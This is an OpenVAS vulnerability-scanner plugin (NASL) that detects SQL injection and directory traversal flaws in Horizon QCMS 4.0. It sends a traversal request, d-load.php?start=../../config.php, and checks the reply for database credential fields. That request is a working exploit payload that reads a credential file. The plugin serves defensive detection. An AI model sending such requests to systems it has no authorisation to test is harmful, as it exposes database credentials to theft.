###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_horizon_qcms_mult_vuln.nasl 14117 2019-03-12 14:02:42Z cfischer $
#
# Horizon QCMS Multiple Vulnerabilities
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804224");
  script_version("$Revision: 14117 $");
  script_cve_id("CVE-2013-7138", "CVE-2013-7139");
  script_bugtraq_id(64715, 64717);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-12 15:02:42 +0100 (Tue, 12 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-01-17 15:28:29 +0530 (Fri, 17 Jan 2014)");
  script_name("Horizon QCMS Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is running Horizon QCMS and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
  is able to read config file.");

  script_tag(name:"insight", value:"Flaw exists in 'd-load.php' and 'download.php' scripts, which fail to
  properly sanitize user-supplied input to 'category' and 'start' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute SQL commands
  or obtain sensitive information.");

  script_tag(name:"affected", value:"Horizon QCMS version 4.0, Other versions may also be affected.");

  script_tag(name:"solution", value:"Upgrade to Horizon QCMS version 4.1 or later.");

  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23191");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/horizon-qcms-40-sql-injection-directory-traversal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.hnqcms.com/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/cms", "/qcms", "/hqcms", "/horizonqcms", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item:string(dir, "/index.php"),  port:http_port);

  if(res &&  "Powered by Horzon QCMS" >< res)
  {
    url = dir + "/lib/functions/d-load.php?start=../../config.php" ;

    req = http_get(item:url,  port:http_port);
    res = http_keepalive_send_recv(port:http_port, data:req);

    if(res &&  "$user" >< res && "$password" >< res && "$dbname" >< res)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);